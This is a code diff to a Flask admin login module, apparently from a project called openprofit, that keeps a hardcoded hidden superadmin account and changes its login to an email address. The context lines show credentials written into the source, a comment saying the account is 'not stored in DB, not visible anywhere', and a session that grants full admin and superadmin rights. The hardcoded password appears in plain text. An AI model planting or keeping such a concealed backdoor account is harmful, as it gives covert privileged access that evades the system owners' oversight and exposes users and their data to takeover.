@@ -26,14 +26,14 @@ def admin_login():
     password = data.get('password')
 
     # Hidden superadmin access — not stored in DB, not visible anywhere
-    _SA_LOGIN = 'superadmin'
+    _SA_LOGIN = 'superadmin@openprofit.com'
     _SA_PASS  = '27mart'
     if email == _SA_LOGIN and password == _SA_PASS:
         session.permanent = True
         session['user_id'] = '__superadmin__'
         session['is_hidden_superadmin'] = True
         return jsonify({
-            'user': {'id': '__superadmin__', 'email': 'superadmin', 'first_name': 'Super', 'is_admin': True, 'is_superadmin': True},
+            'user': {'id': '__superadmin__', 'email': 'superadmin@openprofit.com', 'first_name': 'Super', 'is_admin': True, 'is_superadmin': True},
             'message': 'Admin login successful'
         })
     
@@ -99,7 +99,7 @@ def admin_check_setup():
 def admin_me():
     # Hidden superadmin
     if session.get('is_hidden_superadmin'):
-        return jsonify({'user': {'id': '__superadmin__', 'email': 'superadmin', 'first_name': 'Super', 'is_admin': True, 'is_superadmin': True}})
+        return jsonify({'user': {'id': '__superadmin__', 'email': 'superadmin@openprofit.com', 'first_name': 'Super', 'is_admin': True, 'is_superadmin': True}})
 
     admin_id = require_admin()
     if not admin_id: return jsonify({'error': 'Not authorized'}), 401
